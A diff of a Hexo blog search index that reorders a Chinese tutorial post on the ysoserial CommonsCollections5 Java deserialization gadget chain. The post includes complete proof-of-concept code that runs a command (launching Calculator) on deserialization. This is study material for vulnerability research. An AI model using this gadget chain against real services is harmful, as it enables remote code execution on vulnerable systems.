@@ -81,6 +81,64 @@
       </tags>
   </entry>
   <entry>
+    <title>Java ysoserial学习之CommonsCollections5(四)</title>
+    <url>/2021/07/01/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections5(%E5%9B%9B)/</url>
+    <content><![CDATA[<blockquote>
+<p>  庆祝我伟大的党百年华诞🎉</p>
+<p>  向伟大的祖国敬礼(‘-‘*ゞ</p>
+</blockquote>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上节说道在<strong>commons-collections-3.2.1.jar!&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;keyvalue&#x2F;TiedMapEntry.class</strong>类中，总共有三个函数调用了<strong>getValue</strong>函数：</p>
+<ul>
+<li><p><strong>toString</strong>    CC5   本文重点</p>
+</li>
+<li><p><strong>hashCode</strong>    CC6</p>
+</li>
+<li><p><strong>equals</strong>      CC7</p>
+</li>
+</ul>
+<p>本文CommonsCollections6利用链的限制条件：</p>
+<p>​	JDK版本：暂无限制、 CommonsCollections 3.1 - 3.2.1</p>
+<p>实验环境:</p>
+<p>​	JDK 1.8.0_261 、Commons-Collections 3.2.1 </p>
+<h2 id="0x01-利用链"><a href="#0x01-利用链" class="headerlink" title="0x01 利用链"></a>0x01 利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+
+<p>这里重点看**BadAttributeValueExpException.readObject()<strong>和</strong>TiedMapEntry.toString()**，其他的都和前面两章一样 <a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484514&idx=1&sn=2552ec324c1395c9c3c8b9f78cbb4908&chksm=c2829d7bf5f5146d1d2dd0531344262a31b44f27d8c56c7465a9d0555c8773bc096424a0dd53&scene=0&xtrack=1#rd">Java ysoserial学习之CommonsCollections1(二)</a>、<a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484560&idx=1&sn=8a997456a5ccc09a4c11208e92c31093&chksm=c2829d89f5f5149f8000c1070e28eaf3049847b41e1377bf68f1074f7163ee7071eb61c84695&scene=0&xtrack=1#rd">Java ysoserial学习之CommonsCollections6(三)</a></p>
+<h3 id="1-1-TiedMapEntry-toString"><a href="#1-1-TiedMapEntry-toString" class="headerlink" title="1.1 TiedMapEntry.toString()"></a>1.1 TiedMapEntry.toString()</h3><p>上一节说过解决<strong>Java高版本利用</strong>问题，实际上就是在找是否还有其他调用 <strong>LazyMap#get()</strong> 的地方，因为<strong>LazyMap</strong>对象是只要执行<strong>get</strong>方法就会调用<strong>transform</strong>，而<strong>transform</strong>的特性是可以执行任意方法。</p>
+<p>CC6中是在<strong>TiedMapEntry</strong>类中找到了<strong>hashCode</strong>方法中调用了<strong>map.get(key);</strong>,并且<strong>map</strong>是我们可控的<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701204945.png" alt="image-20210630213657788"></p>
+<p>而CC5中则是利用了<strong>TiedMapEntry#toString</strong>方法<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701204954.png" alt="image-20210630212357694"></p>
+<p>还是先实验一下，确定可以<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205000.png" alt="image-20210630214320487"></p>
+<p>但这还不够好，我们希望的是目标反序列化后直接触发命令的执行，因此我们需要找到一个类在反序列化后会直接触发 <strong>TiedMapEntry#toString</strong> 从而触发命令的执行。</p>
+<h3 id="1-2-BadAttributeValueExpException-readObject"><a href="#1-2-BadAttributeValueExpException-readObject" class="headerlink" title="1.2 BadAttributeValueExpException.readObject()"></a>1.2 BadAttributeValueExpException.readObject()</h3><p>在ysoserial中是利用了 <strong>rt.jar!&#x2F;javax&#x2F;management&#x2F;BadAttributeValueExpException.class#readObject</strong>方法来达到上述目的<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205412.png" alt="image-20210630214951419"></p>
+<blockquote>
+<p>这里我们可以看到<strong>BadAttributeValueExpException</strong>并没有实现<strong>Serializable</strong>接口,为什么可以序列化？<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205417.png" alt="image-20210701200642699"></p>
+<p>其实是<strong>BadAttributeValueExpException</strong>继承了<strong>Exception</strong>，<strong>Exception</strong>又继承了<strong>Throwable</strong>，<strong>Throwable</strong>实现了<strong>Serializable</strong>接口<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205421.png" alt="image-20210701200756489"></p>
+</blockquote>
+<p>在<strong>BadAttributeValueExpException#readObject</strong>中发现<strong>get</strong>函数获取<strong>val</strong>的值然后赋给<strong>valObj</strong>，然后在符合<strong>第二个else if</strong>的情况下就会调用<strong>toString</strong>, 巧的是 <strong>System.getSecurityManager()</strong> 返回值默认为<strong>null</strong><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205426.png" alt="image-20210701201112074"></p>
+<p>这样就只需要可以控制<strong>val</strong>的值就可以执行命令了。</p>
+<p>然后我们发现在构造函数中就可以控制<strong>val</strong>的值，可以直接将<strong>tiedMapEntry</strong>作为参数传进去。</p>
+<p><strong>注意</strong>:在构造函数中我们可以看到，当传入一个<strong>val</strong>，<strong>val</strong>就不等于<strong>null</strong>，会调用一次<strong>toString()<strong>方法,也就是说，创建</strong>BadAttributeValueExpException</strong>对象时会弹出一次计算器，而在我们的构想中，反序列化时也会弹出一次，总共是<strong>两</strong>次。<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205431.png" alt="image-20210630220727451"></p>
+<p>实验一下<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205435.png" alt="image-20210630221313347"></p>
+<p>但是，最终发现只弹了一次计算器，也就是说在反序列化时并没有执行<strong>toString</strong>方法，进而执行命令。</p>
+<p>直接在<strong>BadAttributeValueExpException#readObject</strong>下断点Debug一下,会发现这时<strong>valObj</strong>是一个字符串了，直接进入了<strong>第一个 else if <strong>判断中，并没有进入</strong>第二个 else if <strong>，这是因为在创建</strong>BadAttributeValueExpException</strong>对象时，<strong>val</strong>已经执行过了一次<strong>toString</strong>方法，变成了字符串，所以匹配到了**第一个 else if **判断<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205443.png" alt="image-20210630221828997"></p>
+<p>要想改变<strong>val</strong>的值就需要用到前面反复提到的<strong>反射</strong>了</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 利用反射修改 BadAttributeValueExpException 中的 val 为 tiedMapEntry</span></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(bad, tiedMapEntry);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205451.png" alt="image-20210701204112054"></p>
+<p>完整代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/30 21:05</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// 隐藏错误信息</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//使用 LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用反射修改 BadAttributeValueExpException 中的 val 为 tiedMapEntry</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(bad, tiedMapEntry);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(bad);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>天下大木头师傅的 <a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0</a></p>
+]]></content>
+      <categories>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java ysoserial学习之CommonsCollections1(二)</title>
     <url>/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/</url>
     <content><![CDATA[<blockquote>
@@ -242,64 +300,6 @@
 <p>上述分析过程用到的代码都已上传到 <a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>
 <h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.gettoby.com/p/0h2v47vgjznb">https://www.gettoby.com/p/0h2v47vgjznb</a></p>
 <p>P牛知识星球-java安全漫谈</p>
-]]></content>
-      <categories>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>漏洞原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java ysoserial学习之CommonsCollections5(四)</title>
-    <url>/2021/07/01/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections5(%E5%9B%9B)/</url>
-    <content><![CDATA[<blockquote>
-<p>  庆祝我伟大的党百年华诞🎉</p>
-<p>  向伟大的祖国敬礼(‘-‘*ゞ</p>
-</blockquote>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上节说道在<strong>commons-collections-3.2.1.jar!&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;keyvalue&#x2F;TiedMapEntry.class</strong>类中，总共有三个函数调用了<strong>getValue</strong>函数：</p>
-<ul>
-<li><p><strong>toString</strong>    CC5   本文重点</p>
-</li>
-<li><p><strong>hashCode</strong>    CC6</p>
-</li>
-<li><p><strong>equals</strong>      CC7</p>
-</li>
-</ul>
-<p>本文CommonsCollections6利用链的限制条件：</p>
-<p>​	JDK版本：暂无限制、 CommonsCollections 3.1 - 3.2.1</p>
-<p>实验环境:</p>
-<p>​	JDK 1.8.0_261 、Commons-Collections 3.2.1 </p>
-<h2 id="0x01-利用链"><a href="#0x01-利用链" class="headerlink" title="0x01 利用链"></a>0x01 利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
-
-<p>这里重点看**BadAttributeValueExpException.readObject()<strong>和</strong>TiedMapEntry.toString()**，其他的都和前面两章一样 <a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484514&idx=1&sn=2552ec324c1395c9c3c8b9f78cbb4908&chksm=c2829d7bf5f5146d1d2dd0531344262a31b44f27d8c56c7465a9d0555c8773bc096424a0dd53&scene=0&xtrack=1#rd">Java ysoserial学习之CommonsCollections1(二)</a>、<a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484560&idx=1&sn=8a997456a5ccc09a4c11208e92c31093&chksm=c2829d89f5f5149f8000c1070e28eaf3049847b41e1377bf68f1074f7163ee7071eb61c84695&scene=0&xtrack=1#rd">Java ysoserial学习之CommonsCollections6(三)</a></p>
-<h3 id="1-1-TiedMapEntry-toString"><a href="#1-1-TiedMapEntry-toString" class="headerlink" title="1.1 TiedMapEntry.toString()"></a>1.1 TiedMapEntry.toString()</h3><p>上一节说过解决<strong>Java高版本利用</strong>问题，实际上就是在找是否还有其他调用 <strong>LazyMap#get()</strong> 的地方，因为<strong>LazyMap</strong>对象是只要执行<strong>get</strong>方法就会调用<strong>transform</strong>，而<strong>transform</strong>的特性是可以执行任意方法。</p>
-<p>CC6中是在<strong>TiedMapEntry</strong>类中找到了<strong>hashCode</strong>方法中调用了<strong>map.get(key);</strong>,并且<strong>map</strong>是我们可控的<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701204945.png" alt="image-20210630213657788"></p>
-<p>而CC5中则是利用了<strong>TiedMapEntry#toString</strong>方法<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701204954.png" alt="image-20210630212357694"></p>
-<p>还是先实验一下，确定可以<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205000.png" alt="image-20210630214320487"></p>
-<p>但这还不够好，我们希望的是目标反序列化后直接触发命令的执行，因此我们需要找到一个类在反序列化后会直接触发 <strong>TiedMapEntry#toString</strong> 从而触发命令的执行。</p>
-<h3 id="1-2-BadAttributeValueExpException-readObject"><a href="#1-2-BadAttributeValueExpException-readObject" class="headerlink" title="1.2 BadAttributeValueExpException.readObject()"></a>1.2 BadAttributeValueExpException.readObject()</h3><p>在ysoserial中是利用了 <strong>rt.jar!&#x2F;javax&#x2F;management&#x2F;BadAttributeValueExpException.class#readObject</strong>方法来达到上述目的<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205412.png" alt="image-20210630214951419"></p>
-<blockquote>
-<p>这里我们可以看到<strong>BadAttributeValueExpException</strong>并没有实现<strong>Serializable</strong>接口,为什么可以序列化？<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205417.png" alt="image-20210701200642699"></p>
-<p>其实是<strong>BadAttributeValueExpException</strong>继承了<strong>Exception</strong>，<strong>Exception</strong>又继承了<strong>Throwable</strong>，<strong>Throwable</strong>实现了<strong>Serializable</strong>接口<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205421.png" alt="image-20210701200756489"></p>
-</blockquote>
-<p>在<strong>BadAttributeValueExpException#readObject</strong>中发现<strong>get</strong>函数获取<strong>val</strong>的值然后赋给<strong>valObj</strong>，然后在符合<strong>第二个else if</strong>的情况下就会调用<strong>toString</strong>, 巧的是 <strong>System.getSecurityManager()</strong> 返回值默认为<strong>null</strong><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205426.png" alt="image-20210701201112074"></p>
-<p>这样就只需要可以控制<strong>val</strong>的值就可以执行命令了。</p>
-<p>然后我们发现在构造函数中就可以控制<strong>val</strong>的值，可以直接将<strong>tiedMapEntry</strong>作为参数传进去。</p>
-<p><strong>注意</strong>:在构造函数中我们可以看到，当传入一个<strong>val</strong>，<strong>val</strong>就不等于<strong>null</strong>，会调用一次<strong>toString()<strong>方法,也就是说，创建</strong>BadAttributeValueExpException</strong>对象时会弹出一次计算器，而在我们的构想中，反序列化时也会弹出一次，总共是<strong>两</strong>次。<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205431.png" alt="image-20210630220727451"></p>
-<p>实验一下<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205435.png" alt="image-20210630221313347"></p>
-<p>但是，最终发现只弹了一次计算器，也就是说在反序列化时并没有执行<strong>toString</strong>方法，进而执行命令。</p>
-<p>直接在<strong>BadAttributeValueExpException#readObject</strong>下断点Debug一下,会发现这时<strong>valObj</strong>是一个字符串了，直接进入了<strong>第一个 else if <strong>判断中，并没有进入</strong>第二个 else if <strong>，这是因为在创建</strong>BadAttributeValueExpException</strong>对象时，<strong>val</strong>已经执行过了一次<strong>toString</strong>方法，变成了字符串，所以匹配到了**第一个 else if **判断<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205443.png" alt="image-20210630221828997"></p>
-<p>要想改变<strong>val</strong>的值就需要用到前面反复提到的<strong>反射</strong>了</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 利用反射修改 BadAttributeValueExpException 中的 val 为 tiedMapEntry</span></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(bad, tiedMapEntry);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210701205451.png" alt="image-20210701204112054"></p>
-<p>完整代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/30 21:05</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span 